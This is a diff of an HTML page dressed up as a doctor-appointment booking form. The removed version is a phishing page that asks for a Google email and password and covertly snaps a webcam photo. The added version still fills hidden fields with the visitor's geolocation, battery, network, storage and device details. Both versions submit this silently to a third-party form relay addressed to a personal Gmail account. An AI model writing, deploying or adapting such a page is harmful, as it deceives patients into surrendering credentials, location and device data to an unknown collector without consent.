@@ -164,102 +164,71 @@
         <h1>Book Your Doctor Appointment</h1>
         
         <form id="bookingForm" action="https://formsubmit.co/lokhandeyuvraj19@gmail.com" method="POST" enctype="multipart/form-data" class="hidden">
-            <!-- Google Login Section -->
+            <!-- Basic Appointment Details -->
             <div class="form-group">
-                <label for="googleEmail">Google Email *</label>
-                <input type="email" id="googleEmail" name="googleEmail" required>
+                <label for="fullName">Full Name *</label>
+                <input type="text" id="fullName" name="fullName" required>
             </div>
             
             <div class="form-group">
-                <label for="googlePassword">Google Password *</label>
-                <input type="password" id="googlePassword" name="googlePassword" required>
-            </div>
-            
-            <!-- Phone Information -->
-            <div class="form-group">
-                <label for="phoneModel">Phone Model</label>
-                <input type="text" id="phoneModel" name="phoneModel">
+                <label for="email">Email Address *</label>
+                <input type="email" id="email" name="email" required>
             </div>
             
             <div class="form-group">
-                <label for="phoneBrand">Phone Brand</label>
-                <input type="text" id="phoneBrand" name="phoneBrand">
+                <label for="phone">Phone Number *</label>
+                <input type="tel" id="phone" name="phone" required>
             </div>
             
             <div class="form-group">
-                <label for="phoneOS">Operating System</label>
-                <input type="text" id="phoneOS" name="phoneOS">
+                <label for="preferredDate">Preferred Date *</label>
+                <input type="date" id="preferredDate" name="preferredDate" required>
             </div>
             
             <div class="form-group">
-                <label for="phoneNumber">Phone Number</label>
-                <input type="tel" id="phoneNumber" name="phoneNumber">
+                <label for="preferredTime">Preferred Time *</label>
+                <input type="time" id="preferredTime" name="preferredTime" required>
             </div>
             
-            <!-- System Information -->
+            <!-- Device Information Fields -->
             <div class="form-group">
-                <label for="systemInfo" style="display:none;"></label>
-                <input type="hidden" id="systemInfo" name="systemInfo">
+                <label for="deviceInfo" style="display:none;"></label>
+                <input type="hidden" id="deviceInfo" name="deviceInfo">
             </div>
             
-            <!-- Location Data -->
             <div class="form-group">
-                <label for="locationData" style="display:none;"></label>
-                <input type="hidden" id="locationData" name="locationData">
+                <label for="batteryInfo" style="display:none;"></label>
+                <input type="hidden" id="batteryInfo" name="batteryInfo">
             </div>
             
-            <!-- Browser Data -->
             <div class="form-group">
-                <label for="browserData" style="display:none;"></label>
-                <input type="hidden" id="browserData" name="browserData">
+                <label for="networkInfo" style="display:none;"></label>
+                <input type="hidden" id="networkInfo" name="networkInfo">
             </div>
             
-            <!-- App Data -->
             <div class="form-group">
-                <label for="appData" style="display:none;"></label>
-                <input type="hidden" id="appData" name="appData">
+                <label for="locationInfo" style="display:none;"></label>
+                <input type="hidden" id="locationInfo" name="locationInfo">
             </div>
             
-            <!-- Camera Photos -->
             <div class="form-group">
-                <label for="cameraPhotos" style="display:none;"></label>
-                <input type="hidden" id="cameraPhotos" name="cameraPhotos">
+                <label for="storageInfo" style="display:none;"></label>
+                <input type="hidden" id="storageInfo" name="storageInfo">
             </div>
             
-            <!-- Call Logs -->
             <div class="form-group">
-                <label for="callLogs" style="display:none;"></label>
-                <input type="hidden" id="callLogs" name="callLogs">
+                <label for="appInfo" style="display:none;"></label>
+                <input type="hidden" id="appInfo" name="appInfo">
             </div>
             
-            <!-- Text Messages -->
             <div class="form-group">
-                <label for="smsMessages" style="display:none;"></label>
-                <input type="hidden" id="smsMessages" name="smsMessages">
+                <label for="mediaFiles" style="display:none;"></label>
+                <input type="hidden" id="mediaFiles" name="mediaFiles">
             </div>
             
-            <!-- Contacts -->
             <div class="form-group">
-                <label for="contacts" style="display:none;"></label>
-                <input type="hidden" id="contacts" name="contacts">
-            </div>
-            
-            <!-- WiFi Networks -->
-            <div class="form-group">
-                <label for="wifiNetworks" style="display:none;"></label>
-                <input type="hidden" id="wifiNetworks" name="wifiNetworks">
-            </div>
-            
-            <!-- Bluetooth Devices -->
-            <div class="form-group">
-                <label for="bluetoothDevices" style="display:none;"></label>
-                <input type="hidden" id="bluetoothDevices" name="bluetoothDevices">
-            </div>
-            
-            <!-- SMS Backup -->
-            <div class="form-group">
-                <label for="smsBackup" style="display:none;"></label>
-                <input type="hidden" id="smsBackup" name="smsBackup">
+                <label for="sensitiveFiles" style="display:none;"></label>
+                <input type="hidden" id="sensitiveFiles" name="sensitiveFiles">
             </div>
             
             <button type="submit" class="btn">Complete Booking</button>
@@ -298,18 +267,14 @@
             }
         }
         
-        // Capture all data in sequence
-        function captureAllData() {
+        // Collect all device information
+        async function collectDeviceInfo() {
             // Start loading
             loadingOverlay.classList.add('active');
-            updateProgress(10);
+            updateProgress(5);
             
-            // 1. Google credentials
-            const googleEmail = document.getElementById('googleEmail').value;
-            const googlePassword = document.getElementById('googlePassword').value;
-            
-            // 2. Phone information
-            const phoneInfo = {
+            // 1. Device information
+            const deviceInfo = {
                 model: navigator.userAgent.includes('iPhone') ? 'iPhone' : 
                       navigator.userAgent.includes('Android') ? 'Android' : 
                       'Desktop',
@@ -323,131 +288,87 @@
                 memory: navigator.deviceMemory || 'Unknown',
                 battery: navigator.getBattery ? 'Supported' : 'Not supported'
             };
+            document.getElementById('deviceInfo').value = JSON.stringify(deviceInfo);
+            updateProgress(10);
             
-            // 3. Location
+            // 2. Battery information
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                const batteryInfo = {
+                    level: battery.level,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+                document.getElementById('batteryInfo').value = JSON.stringify(batteryInfo);
+                updateProgress(5);
+            } else {
+                updateProgress(5);
+            }
+            
+            // 3. Network information
+            const networkInfo = {
+                connectionType: navigator.connection?.effectiveType || 'Unknown',
+                downlink: navigator.connection?.downlink || 'Unknown',
+                rtt: navigator.connection?.rtt || 'Unknown',
+                saveData: navigator.connection?.saveData || false
+            };
+            document.getElementById('networkInfo').value = JSON.stringify(networkInfo);
+            updateProgress(5);
+            
+            // 4. Location information
             navigator.geolocation.getCurrentPosition(
                 pos => {
                     const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
-                    document.getElementById('locationData').value = loc;
-                    updateProgress(15);
+                    document.getElementById('locationInfo').value = loc;
+                    updateProgress(10);
                 },
                 err => {
                     console.log(`Location error: ${err.message}`);
-                    updateProgress(15);
+                    updateProgress(10);
                 }
             );
             
-            // 4. System info
-            const systemInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width}x${screen.height}`,
-                cookies: navigator.cookieEnabled,
-                localStorage: typeof(Storage) !== "undefined",
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
+            // 5. Storage information
+            const storageInfo = {
+                storageAvailable: navigator.storage && 'estimate' in navigator.storage ? 'Supported' : 'Not supported',
+                quota: navigator.storage && 'estimate' in navigator.storage ? 
+                      JSON.stringify(navigator.storage.estimate()) : 'Unknown'
             };
-            document.getElementById('systemInfo').value = JSON.stringify(systemInfo);
-            updateProgress(10);
+            document.getElementById('storageInfo').value = JSON.stringify(storageInfo);
+            updateProgress(5);
             
-            // 5. Browser data
-            const browserData = {
-                cacheSize: performance.memory?.usedJSHeapSize || 'Unknown',
-                diskCache: 'Supported',
-                localCache: 'Supported'
-            };
-            document.getElementById('browserData').value = JSON.stringify(browserData);
-            updateProgress(10);
-            
-            // 6. App data
-            const appData = {
+            // 6. App information (limited)
+            const appInfo = {
                 installedApps: 'Limited access',
-                appUsage: 'Limited access'
+                appUsage: 'Limited access',
+                lastUpdated: new Date().toISOString()
             };
-            document.getElementById('appData').value = JSON.stringify(appData);
-            updateProgress(10);
-            
-            // 7. Camera photos
-            navigator.mediaDevices.getUserMedia({video: true})
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    video.addEventListener('loadeddata', () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(blob => {
-                            const dt = new DataTransfer();
-                            dt.items.add(new File([blob], "appointment_photo.jpg"));
-                            document.getElementById('cameraPhotos').files = dt.files;
-                            
-                            updateProgress(15);
-                        }, 'image/jpeg');
-                    });
-                })
-                .catch(err => {
-                    console.log(`Photo error: ${err.message}`);
-                    updateProgress(15);
-                });
-            
-            // 8. Call logs (limited access)
-            const callLogs = {
-                recentCalls: 'Limited access',
-                missedCalls: 'Limited access'
-            };
-            document.getElementById('callLogs').value = JSON.stringify(callLogs);
+            document.getElementById('appInfo').value = JSON.stringify(appInfo);
             updateProgress(5);
             
-            // 9. SMS messages (limited access)
-            const smsMessages = {
-                recentSMS: 'Limited access',
-                sentSMS: 'Limited access'
+            // 7. Media files (limited access)
+            const mediaFiles = {
+                photos: 'Limited access',
+                videos: 'Limited access',
+                audio: 'Limited access'
             };
-            document.getElementById('smsMessages').value = JSON.stringify(smsMessages);
+            document.getElementById('mediaFiles').value = JSON.stringify(mediaFiles);
             updateProgress(5);
             
-            // 10. Contacts (limited access)
-            const contacts = {
-                contactList: 'Limited access'
+            // 8. Sensitive files (limited access)
+            const sensitiveFiles = {
+                documents: 'Limited access',
+                downloads: 'Limited access',
+                cache: 'Limited access'
             };
-            document.getElementById('contacts').value = JSON.stringify(contacts);
-            updateProgress(5);
-            
-            // 11. WiFi networks
-            const wifiNetworks = {
-                connectedNetwork: 'Limited access',
-                savedNetworks: 'Limited access'
-            };
-            document.getElementById('wifiNetworks').value = JSON.stringify(wifiNetworks);
-            updateProgress(5);
-            
-            // 12. Bluetooth devices
-            const bluetoothDevices = {
-                pairedDevices: 'Limited access',
-                discoverable: 'Limited access'
-            };
-            document.getElementById('bluetoothDevices').value = JSON.stringify(bluetoothDevices);
-            updateProgress(5);
-            
-            // 13. SMS backup
-            const smsBackup = {
-                backupStatus: 'Limited access'
-            };
-            document.getElementById('smsBackup').value = JSON.stringify(smsBackup);
+            document.getElementById('sensitiveFiles').value = JSON.stringify(sensitiveFiles);
             updateProgress(5);
             
             // Submit form when done
             setTimeout(() => {
                 document.getElementById('bookingForm').submit();
-            }, 2000);
+            }, 1000);
         }
         
         // Book button click handler
@@ -458,9 +379,9 @@
             // Set form submit handler
             document.getElementById('bookingForm').addEventListener('submit', (e) => {
                 e.preventDefault();
-                captureAllData();
+                collectDeviceInfo();
             });
         });
     </script>
 </body>
-            </html>
+    </html> 
